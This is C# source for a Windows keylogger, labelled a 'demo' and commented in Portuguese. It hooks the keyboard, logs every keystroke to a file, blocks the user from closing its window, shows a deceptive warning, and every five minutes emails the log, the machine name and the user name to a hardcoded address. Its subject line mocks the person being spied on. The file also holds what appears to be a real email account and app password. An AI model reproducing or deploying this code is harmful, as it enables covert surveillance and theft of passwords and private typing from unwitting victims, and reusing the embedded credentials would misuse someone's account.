using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

namespace KeyLoggerDemo
{
    public class Program : Form
    {
        private static string logFilePath = "keylog.txt";
        private static Timer emailTimer;
        private static string userEmail = "macksoupletter@gmail.com"; // Coloque seu email aqui
        private static string emailPassword = "nofe ettp hxvf mqqp"; // Coloque sua senha aqui
        private static string smtpServer = "smtp.exemplo.com"; // Coloque seu servidor SMTP
        private static int smtpPort = 587; // Porta SMTP (geralmente 587 ou 465)

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public Program()
        {
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            ShowWarning();
            SetupEmailTimer();
        }

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run(new Program());
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                LogKey((Keys)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void LogKey(Keys key)
        {
            using (StreamWriter writer = new StreamWriter(logFilePath, true))
            {
                writer.WriteLine(key);
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            // Impede o fechamento do formulário
            e.Cancel = true;
        }

        private void ShowWarning()
        {
            MessageBox.Show("This programm has maded for help purposes, if you close it will make a dangerous mistake, stay warned, do it with your own risk.", "Aviso", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void SetupEmailTimer()
        {
            emailTimer = new Timer(300000); // 5 minutos em milissegundos
            emailTimer.Elapsed += SendLogByEmail;
            emailTimer.AutoReset = true;
            emailTimer.Enabled = true;
        }

        private void SendLogByEmail(object sender, ElapsedEventArgs e)
        {
            try
            {
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string emailBody = "Aqui está o log das teclas.\n\n" +
                                   "Nome da Máquina: " + machineName + "\n" +
                                   "Nome do Usuário: " + userName;

                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(userEmail);
                mail.To.Add("bashlover142@gmail.com"); // Envie para o email desejado
                mail.Subject = "Peguei um Safadinho rsrsrs";
                mail.Body = emailBody;

                Attachment attachment = new Attachment(logFilePath);
                mail.Attachments.Add(attachment);

                SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort);
                smtpClient.Credentials = new NetworkCredential(userEmail, emailPassword);
                smtpClient.EnableSsl = true; // Habilite SSL se necessário

                smtpClient.Send(mail);
                attachment.Dispose();
            }
            catch (Exception ex)
            {
                // Trate exceções de envio de email conforme necessário
                Console.WriteLine("Erro ao enviar email: " + ex.Message);
            }
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
    }
}
